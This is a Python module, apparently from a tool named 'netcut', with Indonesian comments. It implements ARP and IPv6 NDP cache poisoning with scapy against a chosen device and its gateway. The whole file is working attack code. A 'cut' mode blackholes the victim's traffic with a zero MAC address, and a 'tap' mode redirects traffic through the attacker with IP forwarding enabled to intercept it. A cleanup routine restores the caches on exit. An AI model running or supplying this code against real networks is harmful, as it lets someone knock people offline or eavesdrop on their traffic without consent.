"""ARP + NDP spoofing to cut target device from network."""

from __future__ import annotations

import signal
import sys
import time
from dataclasses import dataclass, field
from typing import Literal

from scapy.all import ARP, Ether, sendp
from scapy.layers.inet6 import ICMPv6NDOptDstLLAddr, ICMPv6ND_NA, IPv6

from netcut.platform_ops import set_ip_forwarding
from netcut.verbose import vlog

# MAC kosong = traffic tidak bisa dikirim kemana-mana (true cut, bukan MITM)
BLACKHOLE_MAC = "00:00:00:00:00:00"
BURST_COUNT = 5


@dataclass
class CutTarget:
    ip: str
    mac: str
    gateway_ip: str
    gateway_mac: str
    interface: str
    attacker_mac: str = ""
    target_ipv6: list[str] = field(default_factory=list)
    gateway_ipv6: list[str] = field(default_factory=list)


CutMode = Literal["cut", "tap"]


class ConnectionCutter:
    def __init__(
        self,
        target: CutTarget,
        *,
        mode: CutMode = "cut",
        forward: bool | None = None,
    ):
        self.target = target
        self.mode = mode
        self.forward = forward if forward is not None else mode == "tap"
        self._running = False
        self._restored = False
        self._packets_sent = 0

    def _spoof_mac(self) -> str:
        if self.mode == "tap":
            if not self.target.attacker_mac:
                raise ValueError("tap mode butuh attacker_mac")
            return self.target.attacker_mac
        return BLACKHOLE_MAC

    def _configure_ip_stack(self) -> None:
        set_ip_forwarding(self.forward)
        if self.forward:
            vlog(2, "IP forwarding IPv4/IPv6 diaktifkan (MITM tap)")
        else:
            vlog(2, "IP forwarding IPv4/IPv6 dimatikan")

    def _ensure_no_forwarding(self) -> None:
        set_ip_forwarding(False)
        vlog(2, "IP forwarding IPv4/IPv6 dimatikan")

    def _arp_poison_once(self) -> None:
        t = self.target
        spoof = self._spoof_mac()

        to_target = (
            Ether(dst=t.mac)
            / ARP(
                op=2,
                pdst=t.ip,
                hwdst=t.mac,
                psrc=t.gateway_ip,
                hwsrc=spoof,
            )
        )

        to_gateway = (
            Ether(dst=t.gateway_mac)
            / ARP(
                op=2,
                pdst=t.gateway_ip,
                hwdst=t.gateway_mac,
                psrc=t.ip,
                hwsrc=spoof,
            )
        )

        for _ in range(BURST_COUNT):
            sendp(to_target, verbose=False, iface=t.interface)
            sendp(to_gateway, verbose=False, iface=t.interface)
            self._packets_sent += 2

    def _ndp_na(
        self,
        *,
        eth_dst: str,
        ipv6_src: str,
        ipv6_dst: str,
        tgt: str,
        lladdr: str,
    ):
        return (
            Ether(dst=eth_dst)
            / IPv6(src=ipv6_src, dst=ipv6_dst, hlim=255)
            / ICMPv6ND_NA(tgt=tgt, R=0, S=1, O=1)
            / ICMPv6NDOptDstLLAddr(lladdr=lladdr)
        )

    def _ndp_poison_once(self) -> None:
        t = self.target
        if not t.target_ipv6 or not t.gateway_ipv6:
            return

        spoof = self._spoof_mac()
        for target_v6 in t.target_ipv6:
            for gateway_v6 in t.gateway_ipv6:
                to_target = self._ndp_na(
                    eth_dst=t.mac,
                    ipv6_src=gateway_v6,
                    ipv6_dst=target_v6,
                    tgt=gateway_v6,
                    lladdr=spoof,
                )
                to_gateway = self._ndp_na(
                    eth_dst=t.gateway_mac,
                    ipv6_src=target_v6,
                    ipv6_dst=gateway_v6,
                    tgt=target_v6,
                    lladdr=spoof,
                )
                for _ in range(BURST_COUNT):
                    sendp(to_target, verbose=False, iface=t.interface)
                    sendp(to_gateway, verbose=False, iface=t.interface)
                    self._packets_sent += 2

    def poison_once(self) -> None:
        self._arp_poison_once()
        self._ndp_poison_once()

    def _restore(self) -> None:
        if self._restored:
            return

        t = self.target

        restore_target = (
            Ether(dst=t.mac)
            / ARP(
                op=2,
                pdst=t.ip,
                hwdst=t.mac,
                psrc=t.gateway_ip,
                hwsrc=t.gateway_mac,
            )
        )
        restore_gateway = (
            Ether(dst=t.gateway_mac)
            / ARP(
                op=2,
                pdst=t.gateway_ip,
                hwdst=t.gateway_mac,
                psrc=t.ip,
                hwsrc=t.mac,
            )
        )

        for _ in range(8):
            sendp(restore_target, verbose=False, iface=t.interface)
            sendp(restore_gateway, verbose=False, iface=t.interface)

        for target_v6 in t.target_ipv6:
            for gateway_v6 in t.gateway_ipv6:
                restore_target_v6 = self._ndp_na(
                    eth_dst=t.mac,
                    ipv6_src=gateway_v6,
                    ipv6_dst=target_v6,
                    tgt=gateway_v6,
                    lladdr=t.gateway_mac,
                )
                restore_gateway_v6 = self._ndp_na(
                    eth_dst=t.gateway_mac,
                    ipv6_src=target_v6,
                    ipv6_dst=gateway_v6,
                    tgt=target_v6,
                    lladdr=t.mac,
                )
                for _ in range(8):
                    sendp(restore_target_v6, verbose=False, iface=t.interface)
                    sendp(restore_gateway_v6, verbose=False, iface=t.interface)

        self._restored = True
        vlog(2, "ARP/NDP cache target & gateway di-restore")

    def start(self, interval: float = 0.5) -> None:
        self._running = True
        self._packets_sent = 0
        self._restored = False
        self._configure_ip_stack()

        def _handle_exit(sig, frame):
            self.stop()
            sys.exit(0)

        signal.signal(signal.SIGINT, _handle_exit)
        signal.signal(signal.SIGTERM, _handle_exit)

        while self._running:
            self.poison_once()
            time.sleep(interval)

    def stop(self) -> None:
        self._running = False
        self._restore()

    @property
    def packets_sent(self) -> int:
        return self._packets_sent

    @property
    def ipv6_enabled(self) -> bool:
        return bool(self.target.target_ipv6 and self.target.gateway_ipv6)
